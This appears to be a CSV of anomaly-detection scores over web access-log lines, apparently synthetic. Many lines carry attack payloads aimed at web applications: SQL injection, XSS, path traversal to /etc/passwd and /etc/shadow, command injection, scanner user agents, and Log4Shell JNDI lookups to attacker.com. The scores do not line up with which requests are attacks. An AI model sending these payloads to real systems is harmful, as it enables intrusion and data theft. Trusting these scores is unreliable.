score_content,score_session,score_fused,score_fused_norm,line
1.9387898445129395,,1.9387898445129395,1.9387898445129395,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
11042.9306640625,,11042.9306640625,11042.9306640625,33.113.67.95 - - [10/Jan/2025:12:04:10 +0100] "GET /wp-login.php HTTP/1.1" 503 1176 "https://www.google.com/" "curl/7.68.0"
11044.1591796875,,11044.1591796875,11044.1591796875,96.115.139.250 - - [10/Jan/2025:12:04:14 +0100] "GET /dashboard HTTP/1.1" 500 302 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.019043207168579,,2.019043207168579,2.019043207168579,197.38.243.118 - - [10/Jan/2025:12:04:16 +0100] "GET /admin HTTP/1.1" 200 16464 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.851308822631836,,1.851308822631836,1.851308822631836,122.230.75.249 - - [10/Jan/2025:12:04:16 +0100] "GET /dashboard HTTP/1.1" 204 9784 "https://www.google.com/" "python-requests/2.31.0"
23.55085563659668,,23.55085563659668,23.55085563659668,188.123.231.11 - - [10/Jan/2025:12:04:20 +0100] "GET /search?q=camera HTTP/1.1" 200 3780 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5245832800865173,,0.5245832800865173,0.5245832800865173,115.92.24.84 - - [10/Jan/2025:12:04:20 +0100] "GET /.env HTTP/1.1" 201 7320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.44830322265625,,26.44830322265625,26.44830322265625,51.6.22.138 - - [10/Jan/2025:12:04:25 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 9207 "-" "nikto/2.5.0"
23.88661003112793,,23.88661003112793,23.88661003112793,131.242.15.233 - - [10/Jan/2025:12:04:29 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 19927 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.611705780029297,,23.611705780029297,23.611705780029297,4.73.89.90 - - [10/Jan/2025:12:04:30 +0100] "GET /search?q=phone HTTP/1.1" 200 12316 "https://news.ycombinator.com/" "curl/7.68.0"
3.138655185699463,,3.138655185699463,3.138655185699463,206.114.74.42 - - [10/Jan/2025:12:04:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 302 13718 "https://news.ycombinator.com/" "dirb/2.22"
1.9952048063278198,,1.9952048063278198,1.9952048063278198,122.254.223.135 - - [10/Jan/2025:12:04:35 +0100] "GET /about HTTP/1.1" 200 10036 "-" "curl/7.68.0"
1.990959644317627,,1.990959644317627,1.990959644317627,107.45.143.119 - - [10/Jan/2025:12:04:39 +0100] "GET /about HTTP/1.1" 200 9056 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.5613182187080383,,0.5613182187080383,0.5613182187080383,11.211.212.78 - - [10/Jan/2025:12:04:40 +0100] "GET /.env HTTP/1.1" 200 16175 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.610807418823242,,23.610807418823242,23.610807418823242,40.68.77.245 - - [10/Jan/2025:12:04:44 +0100] "GET /api/product?id=123 HTTP/1.1" 200 180 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.616004943847656,,23.616004943847656,23.616004943847656,233.177.166.63 - - [10/Jan/2025:12:04:44 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8356610536575317,,1.8356610536575317,1.8356610536575317,149.124.145.112 - - [10/Jan/2025:12:04:46 +0100] "GET /phpmyadmin HTTP/1.1" 200 11954 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.9549319744110107,,1.9549319744110107,1.9549319744110107,5.217.67.42 - - [10/Jan/2025:12:04:51 +0100] "GET /profile HTTP/1.1" 200 18950 "-" "python-requests/2.31.0"
0.14950823783874512,,0.14950823783874512,0.14950823783874512,70.93.108.163 - - [10/Jan/2025:12:04:52 +0100] "GET /../../etc/passwd HTTP/1.1" 200 1833 "-" "sqlmap/1.5.10#stable"
1.8096131086349487,,1.8096131086349487,1.8096131086349487,196.25.154.193 - - [10/Jan/2025:12:04:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 6104 "https://twitter.com/" "curl/7.68.0"
1.9662588834762573,,1.9662588834762573,1.9662588834762573,25.137.149.91 - - [10/Jan/2025:12:04:56 +0100] "GET /logout HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.535369873046875,,26.535369873046875,26.535369873046875,88.236.234.42 - - [10/Jan/2025:12:04:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 13600 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.47273063659668,,26.47273063659668,26.47273063659668,158.177.213.244 - - [10/Jan/2025:12:04:58 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 304 18406 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.28125,,30112.28125,30112.28125,123.90.80.177 - - [10/Jan/2025:12:05:01 +0100] "GET /contact HTTP/1.1" 400 35 "https://www.google.com/" "curl/7.68.0"
1.8581722974777222,,1.8581722974777222,1.8581722974777222,8.191.209.31 - - [10/Jan/2025:12:05:04 +0100] "GET /dashboard HTTP/1.1" 200 10083 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.449535369873047,,23.449535369873047,23.449535369873047,34.252.21.109 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.571613311767578,,23.571613311767578,23.571613311767578,9.204.169.132 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=phone HTTP/1.1" 200 3632 "-" "python-requests/2.31.0"
23.816404342651367,,23.816404342651367,23.816404342651367,171.3.194.25 - - [10/Jan/2025:12:05:12 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9984 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.46094512939453,,23.46094512939453,23.46094512939453,8.24.38.217 - - [10/Jan/2025:12:05:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11619 "https://twitter.com/" "python-requests/2.31.0"
23.426555633544922,,23.426555633544922,23.426555633544922,26.210.149.196 - - [10/Jan/2025:12:05:15 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2339 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9862037897109985,,1.9862037897109985,1.9862037897109985,2.250.186.26 - - [10/Jan/2025:12:05:16 +0100] "GET /logout HTTP/1.1" 200 17700 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.072236068546772,,0.072236068546772,0.072236068546772,47.214.91.252 - - [10/Jan/2025:12:05:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3616 "https://news.ycombinator.com/" "dirb/2.22"
1.7491940259933472,,1.7491940259933472,1.7491940259933472,32.120.29.134 - - [10/Jan/2025:12:05:22 +0100] "GET /server-status HTTP/1.1" 200 10398 "https://news.ycombinator.com/" "curl/7.68.0"
0.355970174074173,,0.355970174074173,0.355970174074173,30.99.73.117 - - [10/Jan/2025:12:05:24 +0100] "GET /index.html HTTP/1.1" 200 16277 "https://example.com/" "python-requests/2.31.0"
23.594390869140625,,23.594390869140625,23.594390869140625,75.253.219.110 - - [10/Jan/2025:12:05:29 +0100] "GET /search?q=camera HTTP/1.1" 200 13445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9462711811065674,,1.9462711811065674,1.9462711811065674,173.27.102.113 - - [10/Jan/2025:12:05:32 +0100] "GET /profile HTTP/1.1" 200 16210 "-" "python-requests/2.31.0"
3.4234299659729004,,3.4234299659729004,3.4234299659729004,190.237.229.251 - - [10/Jan/2025:12:05:32 +0100] "GET /.env HTTP/1.1" 301 3433 "-" "curl/7.68.0"
1.8710345029830933,,1.8710345029830933,1.8710345029830933,32.60.215.109 - - [10/Jan/2025:12:05:34 +0100] "GET /dashboard HTTP/1.1" 200 13347 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.946486949920654,,4.946486949920654,4.946486949920654,92.122.171.155 - - [10/Jan/2025:12:05:36 +0100] "GET /login HTTP/1.1" 302 13214 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.18020081520080566,,0.18020081520080566,0.18020081520080566,126.128.60.161 - - [10/Jan/2025:12:05:40 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 8314 "-" "curl/7.68.0"
1.9589412212371826,,1.9589412212371826,1.9589412212371826,249.46.98.155 - - [10/Jan/2025:12:05:40 +0100] "GET /about HTTP/1.1" 200 976 "https://example.com/" "sqlmap/1.5.10#stable"
3.2670562267303467,,3.2670562267303467,3.2670562267303467,197.127.203.120 - - [10/Jan/2025:12:05:41 +0100] "GET /.git/config HTTP/1.1" 302 17137 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
23.844512939453125,,23.844512939453125,23.844512939453125,140.5.244.196 - - [10/Jan/2025:12:05:46 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17812 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.39453125,,30134.39453125,30134.39453125,118.10.9.46 - - [10/Jan/2025:12:05:46 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 906 "https://www.google.com/" "python-requests/2.31.0"
26.563392639160156,,26.563392639160156,26.563392639160156,196.29.146.173 - - [10/Jan/2025:12:05:49 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 16072 "https://twitter.com/" "nikto/2.5.0"
23.829923629760742,,23.829923629760742,23.829923629760742,130.15.101.68 - - [10/Jan/2025:12:05:54 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5221 "https://twitter.com/" "nikto/2.5.0"
26.518938064575195,,26.518938064575195,26.518938064575195,83.16.8.152 - - [10/Jan/2025:12:05:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.939087867736816,,4.939087867736816,4.939087867736816,98.25.110.89 - - [10/Jan/2025:12:05:59 +0100] "GET /admin HTTP/1.1" 302 11282 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.464557647705078,,23.464557647705078,23.464557647705078,152.22.234.177 - - [10/Jan/2025:12:06:01 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10326 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9565443992614746,,1.9565443992614746,1.9565443992614746,118.169.222.109 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 200 1324 "https://example.com/" "dirb/2.22"
11044.3916015625,,11044.3916015625,11044.3916015625,147.100.83.147 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 502 773 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.478605270385742,,23.478605270385742,23.478605270385742,208.196.171.87 - - [10/Jan/2025:12:06:01 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 16574 "https://twitter.com/" "curl/7.68.0"
1.7113054990768433,,1.7113054990768433,1.7113054990768433,216.218.138.55 - - [10/Jan/2025:12:06:03 +0100] "GET /server-status HTTP/1.1" 200 2568 "https://example.com/" "python-requests/2.31.0"
3.4823076725006104,,3.4823076725006104,3.4823076725006104,184.217.149.25 - - [10/Jan/2025:12:06:03 +0100] "GET /.env HTTP/1.1" 304 3113 "https://example.com/" "sqlmap/1.5.10#stable"
23.858226776123047,,23.858226776123047,23.858226776123047,204.20.167.211 - - [10/Jan/2025:12:06:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 11480 "https://twitter.com/" "python-requests/2.31.0"
23.630769729614258,,23.630769729614258,23.630769729614258,65.160.132.117 - - [10/Jan/2025:12:06:05 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13282 "-" "curl/7.68.0"
0.2393820881843567,,0.2393820881843567,0.2393820881843567,170.247.211.191 - - [10/Jan/2025:12:06:10 +0100] "GET /assets/app.js HTTP/1.1" 200 7078 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30112.10546875,,30112.10546875,30112.10546875,161.16.134.52 - - [10/Jan/2025:12:06:15 +0100] "GET /server-status HTTP/1.1" 404 1488 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30134.224609375,,30134.224609375,30134.224609375,82.221.213.234 - - [10/Jan/2025:12:06:16 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 400 840 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.580659866333008,,23.580659866333008,23.580659866333008,176.154.61.104 - - [10/Jan/2025:12:06:19 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 204 8503 "-" "Wget/1.20.3 (linux-gnu)"
26.452831268310547,,26.452831268310547,26.452831268310547,119.125.144.254 - - [10/Jan/2025:12:06:20 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 10275 "https://news.ycombinator.com/" "dirb/2.22"
1.814357042312622,,1.814357042312622,1.814357042312622,8.67.203.206 - - [10/Jan/2025:12:06:25 +0100] "GET /api/products HTTP/1.1" 200 4570 "https://twitter.com/" "curl/7.68.0"
11042.7451171875,,11042.7451171875,11042.7451171875,201.6.15.221 - - [10/Jan/2025:12:06:26 +0100] "GET /wp-login.php HTTP/1.1" 500 995 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.1328125,,30112.1328125,30112.1328125,230.94.172.169 - - [10/Jan/2025:12:06:30 +0100] "GET /phpmyadmin HTTP/1.1" 403 833 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.616905212402344,,23.616905212402344,23.616905212402344,239.31.134.171 - - [10/Jan/2025:12:06:35 +0100] "GET /api/product?id=123 HTTP/1.1" 200 16492 "https://twitter.com/" "python-requests/2.31.0"
1.7991664409637451,,1.7991664409637451,1.7991664409637451,198.207.81.85 - - [10/Jan/2025:12:06:37 +0100] "GET /phpmyadmin HTTP/1.1" 200 4106 "https://www.google.com/" "dirb/2.22"
0.30040138959884644,,0.30040138959884644,0.30040138959884644,113.105.66.221 - - [10/Jan/2025:12:06:40 +0100] "GET /.git/config HTTP/1.1" 200 9096 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3197368383407593,,0.3197368383407593,0.3197368383407593,122.175.64.247 - - [10/Jan/2025:12:06:44 +0100] "GET /.git/config HTTP/1.1" 200 13986 "https://www.google.com/" "python-requests/2.31.0"
30134.412109375,,30134.412109375,30134.412109375,166.248.232.156 - - [10/Jan/2025:12:06:46 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 400 43 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.603670120239258,,23.603670120239258,23.603670120239258,80.164.246.180 - - [10/Jan/2025:12:06:51 +0100] "GET /api/product?id=123 HTTP/1.1" 200 12705 "-" "curl/7.68.0"
23.592674255371094,,23.592674255371094,23.592674255371094,238.251.235.66 - - [10/Jan/2025:12:06:55 +0100] "GET /search?q=camera HTTP/1.1" 200 12977 "-" "curl/7.68.0"
30110.783203125,,30110.783203125,30110.783203125,82.226.208.197 - - [10/Jan/2025:12:06:56 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 404 1293 "-" "dirb/2.22"
23.525806427001953,,23.525806427001953,23.525806427001953,238.216.86.184 - - [10/Jan/2025:12:06:58 +0100] "GET /search?q=headphones HTTP/1.1" 200 13631 "-" "Wget/1.20.3 (linux-gnu)"
1.862199306488037,,1.862199306488037,1.862199306488037,187.209.141.189 - - [10/Jan/2025:12:06:59 +0100] "GET /phpmyadmin HTTP/1.1" 200 19830 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.25793641805648804,,0.25793641805648804,0.25793641805648804,162.114.203.165 - - [10/Jan/2025:12:07:04 +0100] "GET /wp-login.php HTTP/1.1" 201 6120 "-" "curl/7.68.0"
23.55805015563965,,23.55805015563965,23.55805015563965,29.41.64.133 - - [10/Jan/2025:12:07:07 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2794 "https://twitter.com/" "curl/7.68.0"
23.5915470123291,,23.5915470123291,23.5915470123291,67.45.176.152 - - [10/Jan/2025:12:07:12 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4474 "https://example.com/" "sqlmap/1.5.10#stable"
23.542652130126953,,23.542652130126953,23.542652130126953,242.214.227.147 - - [10/Jan/2025:12:07:13 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 12464 "-" "Wget/1.20.3 (linux-gnu)"
30134.34375,,30134.34375,30134.34375,51.68.180.219 - - [10/Jan/2025:12:07:13 +0100] "GET /api/product?id=123 HTTP/1.1" 403 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.82508659362793,,23.82508659362793,23.82508659362793,44.243.146.31 - - [10/Jan/2025:12:07:16 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12156 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.2109375,,30134.2109375,30134.2109375,31.58.183.53 - - [10/Jan/2025:12:07:19 +0100] "GET /search?q=camera HTTP/1.1" 400 1012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.56669807434082,,23.56669807434082,23.56669807434082,154.56.211.73 - - [10/Jan/2025:12:07:21 +0100] "GET /search?q=laptop HTTP/1.1" 200 6870 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.18184401094913483,,0.18184401094913483,0.18184401094913483,61.159.116.233 - - [10/Jan/2025:12:07:24 +0100] "GET /../../etc/passwd HTTP/1.1" 200 8678 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.20815815031528473,,0.20815815031528473,0.20815815031528473,35.224.83.250 - - [10/Jan/2025:12:07:28 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 15464 "https://www.google.com/" "dirb/2.22"
4.680423259735107,,4.680423259735107,4.680423259735107,19.25.143.16 - - [10/Jan/2025:12:07:33 +0100] "GET /server-status HTTP/1.1" 302 8496 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11066.4775390625,,11066.4775390625,11066.4775390625,248.206.154.182 - - [10/Jan/2025:12:07:34 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 503 1373 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5503414273262024,,0.5503414273262024,0.5503414273262024,172.95.34.248 - - [10/Jan/2025:12:07:36 +0100] "GET /.env HTTP/1.1" 200 13033 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.837890625,,30134.837890625,30134.837890625,34.23.82.182 - - [10/Jan/2025:12:07:37 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 958 "https://www.google.com/" "dirb/2.22"
11042.744140625,,11042.744140625,11042.744140625,224.250.214.72 - - [10/Jan/2025:12:07:39 +0100] "GET /wp-login.php HTTP/1.1" 500 1022 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
